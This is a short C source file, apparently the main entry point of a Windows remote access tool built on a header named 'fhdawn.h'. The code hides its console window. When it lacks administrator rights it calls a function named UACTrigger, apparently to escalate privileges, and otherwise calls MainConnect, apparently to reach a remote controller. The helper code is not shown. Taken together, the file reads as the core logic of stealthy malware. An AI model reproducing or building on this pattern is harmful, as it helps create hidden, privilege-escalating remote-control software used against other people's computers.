/*
Author: Fahad (QuantumCore)
main.c (c) 2020
 
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include "fhdawn.h"

int main() // entry point
{
    FreeConsole();
    if(!IsAdmin()){
        UACTrigger();
        exit(0);
    }
    MainConnect();
    return 0;
}
